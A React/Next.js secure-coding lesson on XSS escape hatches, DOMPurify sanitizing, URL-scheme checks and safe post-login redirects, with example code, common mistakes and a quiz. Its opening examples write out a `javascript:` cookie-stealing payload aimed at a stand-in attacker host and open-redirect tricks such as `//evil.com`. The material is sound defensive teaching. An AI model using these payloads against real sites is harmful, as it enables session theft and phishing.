---
title: Browser threats, XSS in React, and safe navigation
tech: React 19.2, Next.js 16, DOMPurify
version: React 19.2, Next.js 16.x, DOMPurify 3
date: 2026-11-07
covers: [1, 2, 4, 10]
---
# Browser threats, XSS in React, and safe navigation
[← Overview](00-overview.md)

## Why it matters
- A support chat renders agent messages with `dangerouslySetInnerHTML` "to support links". One malicious message steals every agent's session.
- A profile's "website" field accepts `javascript:fetch('//evil/'+document.cookie)`; it's rendered as a link that runs the attacker's code on click.
- After login, the app redirects to `?next=https://evil.example/login`, a pixel-perfect phishing page that collects the user's password again.

## Concepts

### The browser threat model
| Threat | What happens | Main defenses |
|:--|:--|:--|
| XSS | attacker script runs in your origin | escaping, sanitizing, CSP, Trusted Types |
| CSRF | another site triggers actions with the user's cookies | `SameSite`, Origin checks, Server Actions protections (lesson 03) |
| Clickjacking | your page framed invisibly under a decoy | `frame-ancestors 'none'` (lesson 02) |
| Supply chain | a dependency or third-party script turns malicious | lockfiles, review, SRI, CSP allowlists |
| Open redirect | your domain sends users to a phishing site | validate redirect targets |
| Data exposure | secrets or private fields reach the client | server-only modules, DTOs (lesson 04) |

### What React protects, and what it doesn't
React escapes **text** in JSX: `<p>{comment}</p>` is safe even if `comment` contains `<script>`. Escape hatches that bypass it:

| Escape hatch | Risk | Safe use |
|:--|:--|:--|
| `dangerouslySetInnerHTML` | raw HTML | sanitize with DOMPurify first, or render Markdown to React elements |
| `href` / `src` / `action` with user URLs | `javascript:` and `data:` URLs | allow only `https:`/`http:`/`mailto:` (React warns about `javascript:` URLs; don't rely on it) |
| `ref.current.innerHTML = …` | same as above | `textContent` |
| `eval`, `new Function`, `setTimeout('code')` | code execution | never with data |
| Spreading user objects as props | `{...userData}` can inject `dangerouslySetInnerHTML` or handlers | pick known fields |
| Third-party components rendering HTML | Markdown/rich-text libraries | configure sanitization |
| Server-rendered JSON in `<script>` | `</script>` breakout | escape `<` (`<`) |

### Sanitizing HTML
When you must render user or CMS HTML, sanitize it with an allowlist-based sanitizer (DOMPurify) right before rendering. Never write your own regex-based sanitizer.

### Safe navigation and redirects
Only redirect to **relative paths on your own origin** (or an explicit allowlist). Reject absolute URLs, protocol-relative `//evil.com`, and tricks like `/\evil.com`.

## Example
`SafeHtml.tsx` — sanitize at render time.
```tsx
'use client';
import DOMPurify from 'dompurify';

export function SafeHtml({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    USE_PROFILES: { html: true },          // HTML only: no SVG/MathML
    FORBID_TAGS: ['style', 'form'],
    FORBID_ATTR: ['style'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```
`safeUrl.ts` — user-provided links.
```ts
const ALLOWED = new Set(['https:', 'http:', 'mailto:']);

export function safeHref(raw: string | null | undefined): string | undefined {
  if (!raw) return undefined;
  try {
    const url = new URL(raw, 'https://placeholder.invalid'); // relative URLs resolve against a dummy base
    return ALLOWED.has(url.protocol) ? raw : undefined;
  } catch {
    return undefined;
  }
}

// <a href={safeHref(profile.website)} rel="noopener noreferrer ugc" target="_blank">Website</a>
```
`safeRedirect.ts` — after login.
```ts
export function safeRedirectPath(next: string | null, fallback = '/'): string {
  if (!next || !next.startsWith('/') || next.startsWith('//') || next.startsWith('/\\')) return fallback;
  const url = new URL(next, 'https://app.example.com');
  return url.origin === 'https://app.example.com' ? url.pathname + url.search + url.hash : fallback;
}

// Server Action or route handler:
// redirect(safeRedirectPath(formData.get('next') as string | null));
```
Picking props instead of spreading untrusted objects:
```tsx
// Wrong: <UserCard {...apiResponse.user} />  — the API (or an attacker) controls every prop
<UserCard name={user.name} avatarUrl={user.avatarUrl} />
```

## Production patterns
- **Text by default**; HTML rendering only through one audited `SafeHtml` component.
- **Validate URL schemes** for every user-supplied link, image, or iframe source.
- **Redirect targets are relative paths or allowlisted**, validated on the server.
- **Lint for escape hatches**: flag `dangerouslySetInnerHTML` outside the safe component in code review (or with `no-restricted-syntax`).
- **CSP as the safety net** for the bug you didn't find (lesson 02).

## Mistakes
Wrong: raw HTML from users or a CMS.
```tsx
<div dangerouslySetInnerHTML={{ __html: post.body }} />
```
Right: `<SafeHtml html={post.body} />`, or render Markdown to React elements without raw HTML.

Wrong: unvalidated links.
```tsx
<a href={user.website}>Website</a> // javascript:… runs on click
```
Right: `href={safeHref(user.website)}`.

Wrong: redirecting to whatever `next` contains.
```ts
redirect(searchParams.get('next') ?? '/'); // https://evil.example works
```
Right: `redirect(safeRedirectPath(next))`.

Wrong: a homemade sanitizer (`html.replace(/<script.*?>.*?<\/script>/g, '')`). Event handler attributes, SVG, and encoding tricks get through. Right: DOMPurify.

## Check yourself
1. Name three ways XSS can happen in a React app despite JSX escaping.
2. Why sanitize right before rendering rather than when saving?
3. Which redirect targets should `safeRedirectPath` reject?

<details>
<summary>Answers</summary>

1. `dangerouslySetInnerHTML` with unsanitized HTML, user URLs with `javascript:` in `href`/`src`, direct DOM writes via refs (`innerHTML`), spreading untrusted objects as props, third-party components that render HTML, and unescaped JSON in script tags.
2. The same data may be rendered in other contexts later (emails, PDFs, other apps), sanitizer rules improve over time, and sanitizing at render protects even data stored before the fix.
3. Absolute URLs to other origins, protocol-relative URLs (`//evil.com`), backslash tricks (`/\evil.com`), and anything that doesn't resolve to your own origin.
</details>

## Sources
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [react.dev — `dangerouslySetInnerHTML`](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [OWASP — Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [Next.js — `redirect`](https://nextjs.org/docs/app/api-reference/functions/redirect)
